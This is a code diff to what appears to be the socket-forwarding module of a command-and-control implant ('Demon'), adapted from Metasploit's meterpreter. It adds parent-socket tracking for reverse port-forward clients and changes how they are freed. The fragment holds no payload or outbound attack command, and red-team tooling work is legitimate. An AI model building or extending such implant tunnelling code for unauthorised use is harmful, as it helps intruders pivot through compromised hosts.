@@ -56,7 +56,7 @@ BOOL InitWSA( VOID )
 }
 
 /* Inspired from https://github.com/rapid7/metasploit-payloads/blob/master/c/meterpreter/source/extensions/stdapi/server/net/socket/tcp_server.c#L277 */
-PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort )
+PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PBYTE IPv6, DWORD LclPort, DWORD FwdAddr, DWORD FwdPort, DWORD ParentID )
 {
     PSOCKET_DATA    Socket    = NULL;
     SOCKADDR_IN     SockAddr  = { 0 };
@@ -180,16 +180,17 @@ PSOCKET_DATA SocketNew( SOCKET WinSock, DWORD Type, BOOL UseIpv4, DWORD IPv4, PB
     }
 
     /* Allocate our Socket object */
-    Socket          = NtHeapAlloc( sizeof( SOCKET_DATA ) );
-    Socket->ID      = RandomNumber32();
-    Socket->Type    = Type;
-    Socket->IPv4    = IPv4;
-    Socket->IPv6    = IPv6;
-    Socket->LclPort = LclPort;
-    Socket->FwdAddr = FwdAddr;
-    Socket->FwdPort = FwdPort;
-    Socket->Socket  = WinSock;
-    Socket->Next    = Instance.Sockets;
+    Socket           = NtHeapAlloc( sizeof( SOCKET_DATA ) );
+    Socket->ID       = RandomNumber32();
+    Socket->ParentID = ParentID;
+    Socket->Type     = Type;
+    Socket->IPv4     = IPv4;
+    Socket->IPv6     = IPv6;
+    Socket->LclPort  = LclPort;
+    Socket->FwdAddr  = FwdAddr;
+    Socket->FwdPort  = FwdPort;
+    Socket->Socket   = WinSock;
+    Socket->Next     = Instance.Sockets;
 
     Instance.Sockets = Socket;
 
@@ -237,9 +238,8 @@ VOID SocketClients()
                 /* set socket to non blocking */
                 if ( Instance.Win32.ioctlsocket( WinSock, FIONBIO, &IoBlock ) != SOCKET_ERROR )
                 {
-                    /* Add the client to the socket linked list so we can read from it later on
-                     * TODO: maybe ad a parent to know from what socket it came from so we can free those clients after we killed/removed the parent */
-                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, TRUE, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort );
+                    /* Add the client to the socket linked list so we can read from it later on */
+                    Client = SocketNew( WinSock, SOCKET_TYPE_CLIENT, TRUE, Socket->IPv4, NULL, Socket->LclPort, Socket->FwdAddr, Socket->FwdPort, Socket->ID );
 
                     /* create socket response package */
                     Package = PackageCreate( DEMON_COMMAND_SOCKET );
@@ -425,7 +425,7 @@ VOID SocketFree( PSOCKET_DATA Socket )
     PRINTF( "Closing socket %x\n", Socket->ID )
 
     /* do we want to remove a reverse port forward client ? */
-    if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED )
+    if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED && Socket->ParentID == 0 )
     {
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
